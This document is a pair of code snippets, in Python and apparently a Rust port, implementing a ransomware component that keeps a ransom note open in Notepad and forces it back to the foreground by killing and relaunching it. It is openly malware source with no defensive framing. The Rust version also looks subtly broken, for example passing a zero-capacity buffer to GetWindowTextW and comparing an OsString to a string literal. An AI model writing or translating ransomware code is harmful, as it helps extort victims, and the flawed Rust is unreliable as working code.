'''Python:

    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1 
            if count == 5:
                break
'''
--------------------------------------------------------------------
'''Rust

use std::process::Command;
use std::thread;
use std::time::Duration;
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};
use winapi::shared::minwindef::HWND;
use winapi::ctypes::c_int;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;

fn show_ransom_note() {
    let mut ransom = Command::new("notepad.exe")
        .arg("RANSOM_NOTE.txt")
        .spawn()
        .expect("failed to start notepad");

    let mut count = 0;
    loop {
        thread::sleep(Duration::from_millis(100));

        let hwnd = unsafe { GetForegroundWindow() };
        let mut text = Vec::new();
        let length = unsafe {
            GetWindowTextW(hwnd, text.as_mut_ptr(), text.capacity())
        };
        if length > 0 {
            text.set_len(length as usize);
            let text: OsString = text.iter().map(|&c| c as u16).collect();
            if &text == "RANSOM_NOTE - Notepad" {
                println!("Ransom note is the top window - do nothing");
            } else {
                println!("Ransom note is not the top window - kill/create process again");
                ransom.kill().expect("failed to kill notepad");
                ransom = Command::new("notepad.exe")
                    .arg("RANSOM_NOTE.txt")
                    .spawn()
                    .expect("failed to start notepad");
            }
        }
        thread::sleep(Duration::from_secs(10));
        count += 1;
        if count == 5 {
            break;
        }
    }
}
'''